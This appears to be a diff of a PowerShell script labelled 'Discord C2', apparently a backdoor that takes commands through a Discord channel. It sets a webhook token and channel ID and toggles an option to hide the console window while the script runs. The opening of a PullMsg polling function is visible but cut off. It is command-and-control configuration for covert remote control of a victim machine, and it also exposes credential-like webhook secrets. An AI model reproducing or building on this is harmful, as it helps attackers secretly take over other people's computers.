@@ -26,7 +26,7 @@ USAGE
 
 # ================================================================ Discord C2 ======================================================================
 
-$token = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC" # make sure your bot is in the same server as the webhook
+$token = "h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC" # make sure your bot is in the same server as the webhook
 $chan = "1168586703536136393" # make sure the bot AND webhook can access this channel
 
 # =============================================================== SCRIPT SETUP =========================================================================
@@ -34,7 +34,7 @@ $chan = "1168586703536136393" # make sure the bot AND webhook can access this ch
 $response = $null
 $previouscmd = $null
 $authenticated = 0
-$HideWindow = 1 # HIDE THE WINDOW - Change to 1 to hide the console window while running
+$HideWindow = 0 # HIDE THE WINDOW - Change to 1 to hide the console window while running
 
 function PullMsg {
     $headers = @{
